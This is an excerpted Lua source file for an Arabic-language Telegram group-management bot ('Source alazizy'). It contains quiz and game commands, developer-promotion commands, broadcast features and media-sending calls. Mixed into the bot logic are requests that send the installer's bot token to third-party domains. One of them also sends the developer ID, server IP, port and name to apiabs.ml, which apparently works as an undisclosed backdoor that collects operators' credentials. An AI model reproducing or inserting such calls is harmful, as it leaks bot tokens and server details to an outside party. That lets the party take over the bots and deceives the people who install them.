...
data,res = https.request("https://apiabs.ml/Api/Mostafa/index.php?Ban=Mostafa&Info&Id="..DevId)
if res == 200 then
...
https.request("https://apiabs.ml/Api/Mostafa/index.php?Get=Mostafa&DevId="..DevAbs:get(Server.."Idalazizy").."&TokenBot="..DevAbs:get(Server.."Tokenalazizy").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
...
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://mocxcc.ml/Mostafa/Api.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⋆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://mocxcc.ml/Mostafa/Api.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⋆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://mocxcc.ml/Mostafa/Api.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⋆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://mocxcc.ml/Mostafa/Api.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
...
{{text = '◗ 𝙩𝙚𝙖𝙢 𝙖𝙡𝙖𝙯𝙞𝙯𝙮 ◖', url = "https://t.me/BANDA1M"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. data.chat_id_ .. '&animation=https://t.me/GifMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source alazizy     --
...
{{text = '◗ 𝙩𝙚𝙖𝙢 𝙖𝙡𝙖𝙯𝙞𝙯𝙮 ◖', url = "https://t.me/BANDA1M"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. data.chat_id_ .. '&photo=https://t.me/PhotosMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
{{text = '◗ 𝙩𝙚𝙖𝙢 𝙖𝙡𝙖𝙯𝙞𝙯𝙮 ◖', url = "https://t.me/BANDA1M"}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. data.chat_id_ .. '&photo=https://t.me/AnimeMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
DevAbs:set(alazizy.."Set:Cmd:Group:New1"..data.chat_id_..":مط","رفع مطوريي")
DevAbs:sadd(alazizy.."List:Cmd:Group:New"..data.chat_id_,"مط")
DevAbs:set(alazizy.."Set:Cmd:Group:New1"..data.chat_id_..":ثانوي","رفع ثثانويي")
...
DevAbs:set(alazizy.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطوريي")
DevAbs:sadd(alazizy.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevAbs:set(alazizy.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع ثثانويي")
...
if text == '⋆ اللب قرعه •' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⋆ مرحبا بك في اوامر اللب قرعه •\n⋆ اليك ما يقدمه هذا القسم •\n⋆ يمكنك اللب قرعه بالثبيت •\n⋆ يمكنك اللب قرعه عام وخاص •\n⋆ يمكنك اللب قرعه عام بتوجيه •\n⋆ يمكنك اللب قرعه خاص بالتوجيه  •'
local key = {
{'لب قرعه بالتثبيت'},
{'لب قرعه خاص','لب قرعه عام'},
{'لب قرعه خاص بالتوجيه','لب قرعه عام بالتوجيه'},
{'رجوع','الغاء'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
...
--     Source alazizy     --
if text == 'اسئله دينيه' and ChCheck(msg) or text == 'سوال ديني' and ChCheck(msg) or text == 'اسالني ف الدين' and ChCheck(msg) then
if not DevAbs:get(alazizy..'Abs:Lock:Games'..msg.chat_id_) then
local alazizyTeam = {
...
if text == 'ادعيه' and ChCheck(msg) or text == 'دعاء' and ChCheck(msg) or text == 'الادعيه' and ChCheck(msg) then
if not DevAbs:get(alazizy..'Abs:Lock:Games'..msg.chat_id_) then
local alazizyTeam = {
...
if text == 'قصص رعب' and ChCheck(msg) or text == 'قصه رعب' and ChCheck(msg) or text == 'قصة رعب' and ChCheck(msg) then
if not DevAbs:get(alazizy..'Abs:Lock:Games'..msg.chat_id_) then
local alazizyTeam = {
...
if text == 'حروف' and ChCheck(msg) or text == 'الحروف' and ChCheck(msg) or text == 'حروف' and ChCheck(msg) then
if not DevAbs:get(alazizy..'Abs:Lock:Games'..msg.chat_id_) then
local alazizyTeam = {
" جماد بحرف ⇇ر  ", 
" مدينة بحرف ⇇ع  ",
...
--     Source alazizy     --
if SudoBot(msg) then
if text == 'لب قرعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function alazizyTeam(extra,result,success)
if DevAbs:get(alazizy.."Abs:Send:Bot"..alazizy) and not AbsSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋆ اللب قرعه معطله من قبل المطور الاساسي")
return false
end
...
if text == "الاخبار" and ChCheck(msg) or text == "اخبار" and ChCheck(msg) or text == "خبر" and ChCheck(msg) or text == "⤌  السورس ⋆" and ChCheck(msg) then
Text = [[
[╭](t.me/BANDA1M)━━━❲[☆](t.me/BANDA1M)tēค๓ ēlk๓คค[☆](t.me/BANDA1M)❳━━━[╮](t.me/BANDA1M)
⋆ اختار الموقع للاطلاع علي الاخبار..🙂🎶♥️
[╰](t.me/BANDA1M)━━━❲[☆](t.me/BANDA1M)tēค๓ ēlk๓คค[☆](t.me/BANDA1M)❳━━━[╯](t.me/BANDA1M)
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
--     Set AbsSudo     --
if Sudo(msg) then
if text ==('اضف مطور اساسي') or text ==('رفع مطوريي اساسي') and ChCheck(msg) then
...
if text and (text:match('^اضف مطور اساسي @(.*)') or text:match('^رفع مطوريي اساسي @(.*)')) and ChCheck(msg) then
local username = text:match('^اضف مطور اساسي @(.*)') or text:match('^رفع مطوريي اساسي @(.*)')
...
if text and (text:match('^اضف مطور اساسي (%d+)') or text:match('^رفع مطوريي اساسي (%d+)')) and ChCheck(msg) then
local user = text:match('اضف مطور اساسي (%d+)') or text:match('رفع مطوريي اساسي (%d+)')
...
--     Set SecondSudo     --
if AbsSudo(msg) then
if text ==('اضف مطور ثانوي') or text ==('رفع ثثانويي') and ChCheck(msg) then
function sudo_reply(extra, result, success)
...
if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع ثثانويي@(.*)')) and ChCheck(msg) then
local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع ثثانويي@(.*)')
function promreply(extra,result,success)
if result.id_ then
...
if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع ثثانويي(%d+)')) and ChCheck(msg) then
local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع ثثانويي(%d+)')
...
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('اضف مطور') or text ==('رفع مطوريي') and ChCheck(msg) then
function sudo_reply(extra, result, success)
...
if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطوريي @(.*)')) and ChCheck(msg) then
local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطوريي @(.*)')
function promreply(extra,result,success)
if result.id_ then
...
if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطوريي (%d+)')) and ChCheck(msg) then
local user = text:match('اضف مطور (%d+)') or text:match('رفع مطوريي (%d+)')
...
--  Set AbsSudoGp  --
if AbsSudo(msg) then
if text ==('رفع مطوريي اساسي مجموعه') and ChCheck(msg) then
...
if text and text:match('^رفع مطوريي اساسي مجموعه @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مطوريي اساسي مجموعه @(.*)')
function promreply(extra,result,success)
if result.id_ then
...
if text and text:match('^رفع مطوريي اساسي مجموعه (%d+)') and ChCheck(msg) then
local user = text:match('رفع مطوريي اساسي مجموعه (%d+)')
...
if text ==('رفع مطوريي اساسي مجموعه') and not AbsSudo(msg) then
...
if text ==('رفع مطوريي مجموعه') and ChCheck(msg) then
function raf_reply(extra, result, success)
...
if text and text:match('^رفع مطوريي مجموعه @(.*)') and ChCheck(msg) then
local username = text:match('^رفع مطوريي مجموعه @(.*)')
function promreply(extra,result,success)
if result.id_ then
...
if text and text:match('^رفع مطوريي مجموعه (%d+)') and ChCheck(msg) then
local user = text:match('رفع مطوريي مجموعه (%d+)')
...
if text ==('رفع مطوريي مجموعه') and not SecondSudoGp(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⋆ هذا الامر للمطورين فقط', 1, 'md')
end
--     Source alazizy     --
--   Set AbsConstructor   --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source alazizy     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source alazizy     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source alazizy     --
...
{{text = '◗ 𝙩𝙚𝙖𝙢 𝙖𝙡𝙖𝙯𝙞𝙯𝙮 ◖', url = "https://t.me/BANDA1M"}}}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source alazizy     --
...
{{text = '◗ 𝙩𝙚𝙖𝙢 𝙖𝙡𝙖𝙯𝙞𝙯𝙮 ◖', url = "https://t.me/BANDA1M"}}}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source alazizy     --
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesMostafa/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source alazizy     --
if Admin(msg) then
...
if text == 'تفعيل اللب قرعه' or text == '⤌ تفعيل اللب قرعه ⋆' and ChCheck(msg) then 
local alazizyTeam = '⋆ اهلا عزيزي ⤌ '..AbsRank(msg)..' \n⋆ تم تفعيل اللب قرعه بنجاح'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, alazizyTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(alazizy.."Abs:Send:Bot"..alazizy)
end
if text == 'تعطيل اللب قرعه' or text == '⤌ تعطيل اللب قرعه ⋆' and ChCheck(msg) then 
local alazizyTeam = '⋆ اهلا عزيزي ⤌ '..AbsRank(msg)..' \n⋆ تم تعطيل اللب قرعه بنجاح'
Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, alazizyTeam, 14, string.len(msg.sender_user_id_))
...
--     Source alazizy     --
if text == "لب قرعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "⤌ لب قرعه خاص ⋆" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevAbs:get(alazizy.."Abs:Send:Bot"..alazizy) and not AbsSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋆ اللب قرعه معطله من قبل المطور الاساسي")
return false
end
...
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "⋆ تم الغاء امر اللب قرعه بنجاح", 1, 'md')
...
--     Source alazizy     --
if text == "لب قرعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "⤌ لب قرعه عام ⋆" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevAbs:get(alazizy.."Abs:Send:Bot"..alazizy) and not AbsSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋆ اللب قرعه معطله من قبل المطور الاساسي")
return false
end
...
--     Source alazizy     --
if text == "لب قرعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "⤌ لب قرعه عام بالتوجيه ⋆" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevAbs:get(alazizy.."Abs:Send:Bot"..alazizy) and not AbsSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋆ اللب قرعه معطله من قبل المطور الاساسي")
return false
end
...
--     Source alazizy     --
if text == "لب قرعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "⤌ لب قرعه خاص بالتوجيه ⋆" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevAbs:get(alazizy.."Abs:Send:Bot"..alazizy) and not AbsSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋆ اللب قرعه معطله من قبل المطور الاساسي")
return false
end
...
--     Source alazizy     --
if text == "لب قرعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "⤌ لب قرعه بالتثبيت ⋆" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevAbs:get(alazizy.."Abs:Send:Bot"..alazizy) and not AbsSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋆ اللب قرعه معطله من قبل المطور الاساسي")
return false
end
...
local msg_id = msg.id_/2097152/0.5 
https.request('https://mocxcc.ml/Mostafa/Api.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source alazizy     --
if SecondSudo(msg) then
